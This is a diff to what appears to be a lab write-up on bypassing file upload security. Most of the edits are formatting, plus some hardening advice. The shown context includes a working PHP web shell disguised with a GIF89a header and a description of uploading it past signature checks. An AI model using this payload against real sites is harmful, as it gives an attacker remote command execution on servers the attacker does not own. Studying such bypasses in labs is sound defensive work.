@@ -20,10 +20,12 @@ Demonstrate multiple techniques to bypass file upload security controls and achi
 **Method**:
 
 ```bash
+
 # Add GIF header to PHP shell
 echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php
 
 # Upload passes signature check
+
 # Clean signature after upload via shell access
 Result: PHP execution despite valid GIF header
 
@@ -64,7 +66,7 @@ Server Hardening: Disable .htaccess overrides in upload directories
 
 Multi-Layer Validation: Combine extension, MIME, and content checks
 
-📊 Skills Demonstrated
+## 📊 Skills Demonstrated
 Multi-Vector Attack: Applying different techniques based on defenses
 
 Server Configuration Analysis: Understanding web server file handling
@@ -73,5 +75,7 @@ Content Manipulation: Differentiating file headers from executable content
 
 Defense-in-Depth Analysis: Evaluating cumulative security control effectiveness
 
-Conducted in controlled environment for educational purposes
+## Notes
+
+Conducted in a controlled environment for educational purposes.
 ```
